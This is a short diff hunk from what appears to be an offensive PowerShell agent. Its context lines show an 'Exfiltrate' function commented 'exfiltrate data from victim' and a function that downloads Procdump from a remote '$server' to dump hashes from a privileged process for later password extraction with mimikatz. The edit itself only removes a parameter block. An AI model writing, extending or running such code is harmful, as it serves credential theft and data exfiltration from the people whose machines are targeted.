@@ -35,9 +35,6 @@ Function Exfiltrate{ # exfiltrate data from victim
 		}
 			
 Function ProccessDumpCommand { # Download and execute Procdump. Dump hash from privileged process. You have to use offline mimikatz to extract password in clear text
-		[CmdletBinding()] param( 
-		[string]$id
-		)
 		if($env:PROCESSOR_ARCHITECTURE -eq "x86"){
 			$downloadURL = "$server/proc32.txt"
 			[string] $FileOnDisk =  "$env:userprofile\AppData\proc32.txt"
